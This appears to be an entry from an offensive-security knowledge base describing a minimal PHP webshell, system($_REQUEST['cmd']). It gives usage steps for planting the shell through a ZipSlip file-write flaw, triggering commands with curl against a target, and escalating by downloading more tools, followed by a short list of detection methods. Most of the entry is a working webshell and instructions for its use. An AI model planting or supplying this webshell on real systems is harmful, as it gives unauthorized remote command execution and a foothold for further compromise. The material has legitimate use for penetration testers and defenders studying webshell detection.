---
type: code
language: php
verified: true
platforms:
  - Linux
  - Windows
tags:
  - webshell
  - payload
  - zipslip
validated: true
---

# PHP-Request-CMD-System-Webshell

## Code

```php
<?php system($_REQUEST["cmd"]); ?>
```

## Description

This is a minimal PHP webshell that executes arbitrary system commands passed via the 'cmd' parameter in HTTP requests (GET or POST). It provides remote code execution when accessed via a web browser or curl, such as http://target/shell.php?cmd=ls. Designed for post-exploitation after file write vulnerabilities like ZipSlip.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | The code uses $_REQUEST["cmd"] dynamically; no static variables. | cmd=whoami |

## Usage

Embed this code into a file named shell.php and place it in a web-accessible directory via ZipSlip or similar. Trigger by appending ?cmd=<command> to the URL. For example, use curl: curl 'http://target/shell.php?cmd=id'. Ideal for initial foothold after traversal write; escalate by running commands like downloading additional tools.

## Detection

- Web server logs showing requests to .php files with 'cmd' parameter.
- Filesystem scans for unexpected .php files in web roots containing system() calls.
- Runtime analysis: Monitor process spawning from httpd/php-fpm where input comes from HTTP.
- Static analysis: Grep for system($_REQUEST or similar in uploaded/extracted files.

## Related

- [[procedures/ZipSlip-Directory-Traversal-with-File-Overwrite]]
